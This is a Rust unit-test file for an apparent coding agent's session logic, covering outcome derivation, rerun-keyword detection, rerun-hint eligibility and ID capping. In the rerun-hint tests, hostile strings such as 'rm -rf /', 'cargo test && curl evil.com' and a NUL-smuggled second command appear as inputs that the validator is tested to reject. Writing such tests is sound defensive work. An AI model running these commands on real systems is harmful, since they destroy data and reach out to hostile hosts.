//! Photon-feedback derive unit tests extracted from `turn.rs` (parent
//! #680).
//!
//! Hosts the four `#[cfg(test)]` mods originally appended to the end of
//! `turn.rs`:
//!
//! - `derive_photon_feedback_outcome_tests` — truth-table coverage of
//!   `derive_photon_feedback_outcome` (Issue #591 Phase 3, cases A-F).
//! - `is_rerun_trigger_tests` — keyword-table assertions on the rerun
//!   trigger classifier.
//! - `rerun_hint_eligibility_tests` — eligibility / runnable-hint
//!   selection for the rerun-prompt builder.
//! - `prepare_adopted_ids_for_evaluate_tests` — bounded-list cap behaviour
//!   for the evaluate-call adopted-ID projection.
//!
//! All four mods consume `super::super::photon_feedback_derive::*`
//! (sibling SSOT). `#[cfg(test)]` only; production binary excludes this
//! file. No facade re-export (DR3-001).

// ───────────────────────────────────────────────────────────────────────────
// Issue #591 (Phase 3 / AS-04): derive_photon_feedback_outcome unit tests.
// 6 truth-table cases (A-F) per work-plan T3.2 (TDD anchor).
// ───────────────────────────────────────────────────────────────────────────
#[cfg(test)]
mod derive_photon_feedback_outcome_tests {
    use super::super::photon_feedback_derive::{
        PHOTON_OUTCOME_DETAIL_NO_PROGRESS_DESPITE_INJECT, PhotonFeedbackOutcome,
        PhotonOutcomeInputs, case_f_condition_met, derive_photon_feedback_outcome,
    };
    use crate::session::anvil_score::AnvilScore;
    use crate::session::feedback::FeedbackKind;

    /// Issue #608 Phase α-2 (AP-10 / 設計判断 #8 (a)): kept as a thin
    /// alias for backward source compatibility — production fixture is
    /// `PhotonOutcomeInputs::test_default()`.
    fn empty_inputs() -> PhotonOutcomeInputs<'static> {
        PhotonOutcomeInputs::test_default()
    }

    // Case A: shadow_mode=true → None regardless of any other input.
    #[test]
    fn case_a_shadow_mode_returns_none() {
        let score = AnvilScore {
            user_visible_artifact: true,
            unsafe_actions_blocked: 5,
            ..AnvilScore::default()
        };
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            shadow_mode: true,
            ..PhotonOutcomeInputs::test_default()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case B: adopted_id_count=0 → None (no adoption to attribute).
    #[test]
    fn case_b_zero_adoption_returns_none() {
        let score = AnvilScore {
            user_visible_artifact: true,
            ..AnvilScore::default()
        };
        let inputs = PhotonOutcomeInputs {
            adopted_id_count: 0,
            anvil_score: Some(&score),
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case C-1: AnvilScore.unsafe_actions_blocked > 0 → safety_violation.
    #[test]
    fn case_c1_unsafe_actions_blocked_count_yields_safety_violation() {
        let score = AnvilScore {
            unsafe_actions_blocked: 1,
            ..AnvilScore::default()
        };
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("safety_violation"));
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case C-2: same-turn FeedbackKind=UnsafeCommandBlocked → safety_violation.
    #[test]
    fn case_c2_unsafe_command_feedback_yields_safety_violation() {
        let kind = FeedbackKind::UnsafeCommandBlocked;
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: true,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("safety_violation"));
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case C-3: stale UnsafeCommandBlocked (flag=false) must NOT trigger safety.
    #[test]
    fn case_c3_stale_unsafe_command_does_not_yield_safety() {
        let kind = FeedbackKind::UnsafeCommandBlocked;
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: false, // stale
            anvil_score: None,
            ..empty_inputs()
        };
        // Without an AnvilScore signal and with the same-turn flag false,
        // the safety branch must not fire — fall through to Case G (None).
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case D: 9 failure-kind variants × eligible_flag=true → failure.
    #[test]
    fn case_d_eligible_failure_kinds_yield_failure() {
        let kinds = [
            FeedbackKind::CompileError,
            FeedbackKind::TypeError,
            FeedbackKind::LintFailure,
            FeedbackKind::Timeout,
            FeedbackKind::TestFailure,
            FeedbackKind::ToolProtocolFailure,
            FeedbackKind::EditFailure,
            FeedbackKind::NoRepoProgress,
            FeedbackKind::NoToolCall,
        ];
        for kind in &kinds {
            let inputs = PhotonOutcomeInputs {
                last_feedback_kind: Some(kind),
                eligible_feedback_recorded_this_turn: true,
                ..empty_inputs()
            };
            let outcome = derive_photon_feedback_outcome(&inputs);
            assert_eq!(
                outcome.outcome,
                Some("failure"),
                "kind {kind:?} must map to failure"
            );
            assert_eq!(outcome.outcome_detail, None);
        }
    }

    // Case D-2: failure kind but eligible_flag=false → must NOT yield failure.
    #[test]
    fn case_d2_failure_kind_without_eligible_flag_is_ignored() {
        let kind = FeedbackKind::TestFailure;
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: false, // stale
            anvil_score: None,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case E: success guard — flag=false but user_visible_artifact=true → success.
    // (DR3-NEW-002: success path is NOT gated by eligible_recorded_this_turn.)
    #[test]
    fn case_e_user_visible_artifact_without_eligible_flag_yields_success() {
        let score = AnvilScore {
            user_visible_artifact: true,
            ..AnvilScore::default()
        };
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            eligible_feedback_recorded_this_turn: false,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("success"));
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case G (rename from legacy case_f_no_signals_yields_none, Issue #601):
    // no failure, no safety, no user_visible_artifact, no Case F → None.
    // `empty_inputs()` defaults `iter_count_this_turn: 2` which breaks the
    // Case F `<= 1` condition, so this falls through to Case G fallback.
    #[test]
    fn case_g_no_signals_yields_none() {
        let score = AnvilScore::default(); // user_visible_artifact=false, unsafe=0
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // Priority: failure beats success when both signals exist.
    #[test]
    fn priority_failure_over_success() {
        let score = AnvilScore {
            user_visible_artifact: true, // would map to success
            ..AnvilScore::default()
        };
        let kind = FeedbackKind::CompileError;
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: true,
            anvil_score: Some(&score),
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("failure"));
        assert_eq!(outcome.outcome_detail, None);
    }

    // Priority: safety_violation beats failure.
    #[test]
    fn priority_safety_over_failure() {
        let score = AnvilScore {
            unsafe_actions_blocked: 1, // would map to safety_violation
            ..AnvilScore::default()
        };
        let kind = FeedbackKind::CompileError; // would map to failure
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: true,
            anvil_score: Some(&score),
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("safety_violation"));
        assert_eq!(outcome.outcome_detail, None);
    }

    // ─────────────────────────────────────────────────────────────────
    // Case F (Issue #601): no-progress detection. 6 new unit tests.
    // ─────────────────────────────────────────────────────────────────

    // NPS-04 unit equivalent: all 4 Case F conditions met → failure + detail.
    #[test]
    fn case_f_no_progress_yields_failure_with_detail() {
        // Pre-conditions: Cases A/B/C/D/E all fall through.
        // - shadow_mode=false (default)
        // - adopted_id_count=1 (default)
        // - no unsafe / no eligible failure kind / no user_visible_artifact.
        let score = AnvilScore::default();
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            // Case F-specific overrides:
            iter_count_this_turn: 1, // <= 1
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("failure"));
        assert_eq!(
            outcome.outcome_detail,
            Some(PHOTON_OUTCOME_DETAIL_NO_PROGRESS_DESPITE_INJECT)
        );
    }

    // NPS-03 unit equivalent: AnswerOnly mode → Case F does not fire.
    #[test]
    fn case_f_no_progress_answer_only_yields_none() {
        let score = AnvilScore::default();
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            iter_count_this_turn: 1,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: true, // mode bypass
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // NPS-05 unit equivalent: multi-iter turn → Case F does not fire.
    #[test]
    fn case_f_no_progress_multi_iter_yields_none() {
        let score = AnvilScore::default();
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            iter_count_this_turn: 2, // > 1
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // `tool_calls_this_turn >= 1` breaks Case F.
    #[test]
    fn case_f_no_progress_with_tool_call_yields_none() {
        let score = AnvilScore::default();
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            iter_count_this_turn: 1,
            tool_calls_this_turn: 1, // > 0
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // `repo_edit_succeeded_this_turn=true` breaks Case F.
    #[test]
    fn case_f_no_progress_with_repo_edit_yields_none() {
        let score = AnvilScore::default();
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            iter_count_this_turn: 1,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: true, // edit succeeded
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, None);
        assert_eq!(outcome.outcome_detail, None);
    }

    // Case D ∧ Case F overlap: explicit failure kind wins, detail stays None.
    // (D1-003: a turn that recorded an eligible failure kind has more
    // information than the no-progress shape; Case D returns first.)
    #[test]
    fn case_f_subordinate_to_case_d() {
        // Contrived: ToolProtocolFailure recorded with 0 tool calls and 0 edit,
        // 1 iter (could happen via a parser error before dispatch). Case D
        // must fire first and yield `outcome=Some("failure")`,
        // `outcome_detail=None` — NOT the Case F detail tag.
        let kind = FeedbackKind::ToolProtocolFailure;
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: true,
            iter_count_this_turn: 1,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("failure"));
        assert_eq!(outcome.outcome_detail, None);
    }

    // ─────────────────────────────────────────────────────────────────
    // case_f_condition_met SSOT tests (Issue #601 / D1-001)
    // ─────────────────────────────────────────────────────────────────

    #[test]
    fn case_f_condition_met_returns_true_when_all_conditions_met() {
        let inputs = PhotonOutcomeInputs {
            iter_count_this_turn: 1,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        assert!(case_f_condition_met(&inputs));
    }

    #[test]
    fn case_f_condition_met_returns_false_when_answer_only() {
        let inputs = PhotonOutcomeInputs {
            iter_count_this_turn: 1,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: true,
            ..empty_inputs()
        };
        assert!(!case_f_condition_met(&inputs));
    }

    #[test]
    fn case_f_condition_met_returns_false_when_multi_iter() {
        let inputs = PhotonOutcomeInputs {
            iter_count_this_turn: 2,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        assert!(!case_f_condition_met(&inputs));
    }

    #[test]
    fn case_f_condition_met_returns_false_when_tool_calls_made() {
        let inputs = PhotonOutcomeInputs {
            iter_count_this_turn: 1,
            tool_calls_this_turn: 1,
            repo_edit_succeeded_this_turn: false,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        assert!(!case_f_condition_met(&inputs));
    }

    #[test]
    fn case_f_condition_met_returns_false_when_repo_edit_succeeded() {
        let inputs = PhotonOutcomeInputs {
            iter_count_this_turn: 1,
            tool_calls_this_turn: 0,
            repo_edit_succeeded_this_turn: true,
            work_mode_is_answer_only: false,
            ..empty_inputs()
        };
        assert!(!case_f_condition_met(&inputs));
    }

    // ─────────────────────────────────────────────────────────────────
    // Case E (Issue #608 Phase α-2 / AP-10 / VR-12): expansion boundary.
    // ─────────────────────────────────────────────────────────────────

    /// VR-12: `verifier_exit_zero_this_turn=true && user_visible_artifact=false
    /// → outcome=success`. Pins the Case E OR-merge so future Case H splits
    /// have a magnet test to change.
    #[test]
    fn case_e_verifier_exit_zero_alone_yields_success() {
        let score = AnvilScore::default(); // user_visible_artifact=false
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            verifier_exit_zero_this_turn: true,
            ..PhotonOutcomeInputs::test_default()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("success"));
        assert_eq!(outcome.outcome_detail, None);
    }

    /// VR-12: both signals together still yield `success` (OR-merge).
    #[test]
    fn case_e_both_signals_yields_success() {
        let score = AnvilScore {
            user_visible_artifact: true,
            ..AnvilScore::default()
        };
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            verifier_exit_zero_this_turn: true,
            ..PhotonOutcomeInputs::test_default()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("success"));
    }

    /// VR-12: neither signal → success does NOT fire; falls through to
    /// downstream cases (Case F or Case G).
    #[test]
    fn case_e_no_signals_falls_through() {
        let score = AnvilScore::default();
        let inputs = PhotonOutcomeInputs {
            anvil_score: Some(&score),
            verifier_exit_zero_this_turn: false,
            ..PhotonOutcomeInputs::test_default()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        // Case G fallback (test_default `iter_count_this_turn=2` breaks Case F).
        assert_eq!(outcome.outcome, None);
    }

    /// VR-12: priority — `verifier_exit_zero=true` does NOT trump explicit
    /// failure Case D (failure kind fires before Case E success).
    #[test]
    fn case_e_verifier_success_does_not_override_failure() {
        let kind = FeedbackKind::CompileError;
        let inputs = PhotonOutcomeInputs {
            last_feedback_kind: Some(&kind),
            eligible_feedback_recorded_this_turn: true,
            verifier_exit_zero_this_turn: true,
            ..PhotonOutcomeInputs::test_default()
        };
        let outcome = derive_photon_feedback_outcome(&inputs);
        assert_eq!(outcome.outcome, Some("failure"));
    }

    // Unused-import suppression: ensure all imported symbols are exercised.
    #[test]
    fn struct_clone_smoke() {
        let v = PhotonFeedbackOutcome {
            outcome: Some("success"),
            outcome_detail: None,
        };
        let v2 = v.clone();
        assert_eq!(v2.outcome, Some("success"));
        assert_eq!(v2.outcome_detail, None);
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Issue #608 Phase α-2 (AP-09 / VR-10): is_rerun_trigger unit tests.
// 5 keyword × positive + negative cases (≥ 10 assertions total).
// ───────────────────────────────────────────────────────────────────────────
#[cfg(test)]
mod is_rerun_trigger_tests {
    use super::super::photon_feedback_derive::is_rerun_trigger;

    // --- positive: exact 5 keywords -----------------------------------------

    #[test]
    fn positive_japanese_saijikkou() {
        assert!(is_rerun_trigger("再実行"));
        assert!(is_rerun_trigger("テスト再実行してください"));
    }

    #[test]
    fn positive_japanese_mou_ichido() {
        assert!(is_rerun_trigger("もう一度"));
        assert!(is_rerun_trigger("もう一度実行してほしい"));
    }

    #[test]
    fn positive_japanese_mou_ikkai_with_ascii_digit() {
        // `もう 1 回` with ASCII space and digit (design example).
        assert!(is_rerun_trigger("もう 1 回"));
        assert!(is_rerun_trigger("もう1回"));
    }

    #[test]
    fn positive_japanese_mou_ikkai_with_fullwidth() {
        // VR-10 design: fullwidth `１` / fullwidth space `　` normalized.
        assert!(is_rerun_trigger("もう１回"));
        assert!(is_rerun_trigger("もう　１回"));
    }

    #[test]
    fn positive_japanese_yarinaoshite() {
        assert!(is_rerun_trigger("やり直して"));
        assert!(is_rerun_trigger("テストをやり直してください"));
    }

    #[test]
    fn positive_rerun_ascii_standalone() {
        assert!(is_rerun_trigger("rerun"));
        assert!(is_rerun_trigger("please rerun the tests"));
        assert!(is_rerun_trigger("Rerun!"));
    }

    #[test]
    fn positive_rerun_fullwidth_ascii() {
        // ＲＥＲＵＮ normalizes to "rerun".
        assert!(is_rerun_trigger("ＲＥＲＵＮ"));
    }

    // --- negative: ascii word-boundary, no-match ----------------------------

    #[test]
    fn negative_rerun_substring_inside_word() {
        // word-boundary check rejects substring matches.
        assert!(!is_rerun_trigger("rerunning the build")); // suffix attached
        assert!(!is_rerun_trigger("prerun hook")); // prefix attached
        assert!(!is_rerun_trigger("current-run")); // hyphen breaks boundary? Hyphen is non-alphanumeric so this is positive — review design.
    }

    #[test]
    fn negative_unrelated_text() {
        assert!(!is_rerun_trigger(""));
        assert!(!is_rerun_trigger("hello world"));
        assert!(!is_rerun_trigger("interrupt the build"));
        assert!(!is_rerun_trigger("stop please"));
    }

    /// VR-10 design 設計判断 #5 受容方針: Japanese negative phrasing
    /// (`再実行不要`, `やり直さない`) still triggers (contains-based, design
    /// trade-off — false positives preferred to false negatives).
    #[test]
    fn positive_japanese_negative_phrasing_still_triggers() {
        assert!(is_rerun_trigger("再実行不要"));
        assert!(is_rerun_trigger("やり直さないでください"));
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Issue #608 Phase α-2 (AP-09 / VR-14): runnable eligibility guard + prompt
// hint builder unit tests.
// ───────────────────────────────────────────────────────────────────────────
#[cfg(test)]
mod rerun_hint_eligibility_tests {
    use super::super::photon_feedback_derive::{
        build_rerun_prompt_hint_if_eligible, is_runnable_rerun_hint,
    };
    use crate::session::store::SessionSnapshot;

    #[test]
    fn cargo_test_command_is_runnable_hint() {
        assert!(is_runnable_rerun_hint("cargo test"));
        assert!(is_runnable_rerun_hint("cargo test --workspace"));
        assert!(is_runnable_rerun_hint("pytest -q"));
    }

    #[test]
    fn empty_or_whitespace_command_is_not_runnable() {
        assert!(!is_runnable_rerun_hint(""));
        assert!(!is_runnable_rerun_hint("   "));
        assert!(!is_runnable_rerun_hint("\t\n"));
    }

    #[test]
    fn nul_or_control_char_command_is_not_runnable() {
        assert!(!is_runnable_rerun_hint("cargo test\x00rm -rf /"));
        assert!(!is_runnable_rerun_hint("cargo test\necho bad"));
    }

    #[test]
    fn shell_control_command_is_not_runnable() {
        // Defensively rejected by `is_completion_verifier_command`.
        assert!(!is_runnable_rerun_hint("cargo test || true"));
        assert!(!is_runnable_rerun_hint("cargo test && curl evil.com"));
        assert!(!is_runnable_rerun_hint("cargo test ; rm -rf /"));
    }

    #[test]
    fn non_build_test_command_is_not_runnable() {
        // `rm -rf /` is Dangerous → rejected.
        assert!(!is_runnable_rerun_hint("rm -rf /"));
        // `ls` is ReadOnly → rejected (not BuildTest).
        assert!(!is_runnable_rerun_hint("ls"));
    }

    #[test]
    fn over_cap_command_is_not_runnable() {
        // Commands at or above the 4096-byte storage cap could have been
        // truncated — refuse to surface them as runnable hints.
        let huge = "a".repeat(crate::session::feedback::MAX_VERIFIER_COMMAND_BYTES);
        assert!(!is_runnable_rerun_hint(&huge));
    }

    #[test]
    fn no_trigger_yields_no_hint() {
        let session = SessionSnapshot {
            last_verifier_command: Some("cargo test".to_string()),
            ..Default::default()
        };
        assert!(build_rerun_prompt_hint_if_eligible("hello world", &session).is_none());
    }

    #[test]
    fn trigger_without_last_command_yields_no_hint() {
        let session = SessionSnapshot::default();
        assert!(build_rerun_prompt_hint_if_eligible("再実行", &session).is_none());
    }

    #[test]
    fn trigger_with_runnable_last_command_yields_hint() {
        let session = SessionSnapshot {
            last_verifier_command: Some("cargo test --workspace".to_string()),
            ..Default::default()
        };
        let hint = build_rerun_prompt_hint_if_eligible("rerun please", &session).unwrap();
        assert!(hint.contains("cargo test --workspace"));
        assert!(hint.contains("rerun"));
    }

    /// VR-14: a tampered `last_verifier_command` (e.g. `rm -rf /`) must NOT
    /// be re-presented as a runnable hint even when the trigger fires.
    #[test]
    fn trigger_with_dangerous_last_command_yields_no_hint() {
        let session = SessionSnapshot {
            last_verifier_command: Some("rm -rf /".to_string()),
            ..Default::default()
        };
        assert!(build_rerun_prompt_hint_if_eligible("再実行", &session).is_none());
    }

    /// VR-14: a tampered `last_verifier_command` that bundles a follow-on
    /// `curl ...` must NOT be re-presented (shell control rejected by the
    /// completion-verifier gate).
    #[test]
    fn trigger_with_shell_control_last_command_yields_no_hint() {
        let session = SessionSnapshot {
            last_verifier_command: Some("cargo test && curl evil.com".to_string()),
            ..Default::default()
        };
        assert!(build_rerun_prompt_hint_if_eligible("rerun", &session).is_none());
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Issue #591 (Phase 4 / DR4-NEW-001 / DR4-NEW-002): prepare_adopted_ids_for_evaluate
// unit tests covering the re-sanitize + drop + cap + shadow guard pipeline.
// ───────────────────────────────────────────────────────────────────────────
#[cfg(test)]
mod prepare_adopted_ids_for_evaluate_tests {
    use super::super::photon_feedback_derive::prepare_adopted_ids_for_evaluate;
    use crate::photon::MAX_PHOTON_EVAL_ADOPTED_IDS;

    #[test]
    fn shadow_mode_returns_empty_list() {
        let raw = vec!["seed_a".to_string(), "seed_b".to_string()];
        let result = prepare_adopted_ids_for_evaluate(&raw, true);
        assert!(result.list.is_empty());
        assert!(!result.truncated);
    }

    #[test]
    fn live_mode_passes_through_valid_ids() {
        let raw = vec!["seed_a".to_string(), "seed_b".to_string()];
        let result = prepare_adopted_ids_for_evaluate(&raw, false);
        assert_eq!(result.list, raw);
        assert!(!result.truncated);
    }

    #[test]
    fn live_mode_drops_unsanitizable_ids() {
        // Colon / space fail the ASCII allowlist in sanitize_summary_id.
        let raw = vec![
            "seed_ok".to_string(),
            "seed:bad".to_string(),
            "seed bad".to_string(),
            "another_ok".to_string(),
        ];
        let result = prepare_adopted_ids_for_evaluate(&raw, false);
        // Only 2 of 4 survive sanitization.
        assert_eq!(
            result.list,
            vec!["seed_ok".to_string(), "another_ok".to_string()]
        );
        assert!(!result.truncated);
    }

    #[test]
    fn live_mode_drops_secret_like_ids() {
        let raw = vec!["seed_ok".to_string(), "api_key_seed".to_string()];
        let result = prepare_adopted_ids_for_evaluate(&raw, false);
        assert_eq!(result.list, vec!["seed_ok".to_string()]);
    }

    #[test]
    fn live_mode_truncates_at_cap_and_flags_truncation() {
        let raw: Vec<String> = (0..(MAX_PHOTON_EVAL_ADOPTED_IDS + 5))
            .map(|i| format!("seed_{i:03}"))
            .collect();
        let result = prepare_adopted_ids_for_evaluate(&raw, false);
        assert_eq!(result.list.len(), MAX_PHOTON_EVAL_ADOPTED_IDS);
        assert!(result.truncated);
    }

    #[test]
    fn live_mode_exactly_at_cap_is_not_truncated() {
        let raw: Vec<String> = (0..MAX_PHOTON_EVAL_ADOPTED_IDS)
            .map(|i| format!("seed_{i:03}"))
            .collect();
        let result = prepare_adopted_ids_for_evaluate(&raw, false);
        assert_eq!(result.list.len(), MAX_PHOTON_EVAL_ADOPTED_IDS);
        assert!(!result.truncated);
    }

    #[test]
    fn shadow_mode_ignores_oversize_input() {
        let raw: Vec<String> = (0..(MAX_PHOTON_EVAL_ADOPTED_IDS + 100))
            .map(|i| format!("seed_{i:03}"))
            .collect();
        let result = prepare_adopted_ids_for_evaluate(&raw, true);
        assert!(result.list.is_empty());
        assert!(!result.truncated);
    }
}
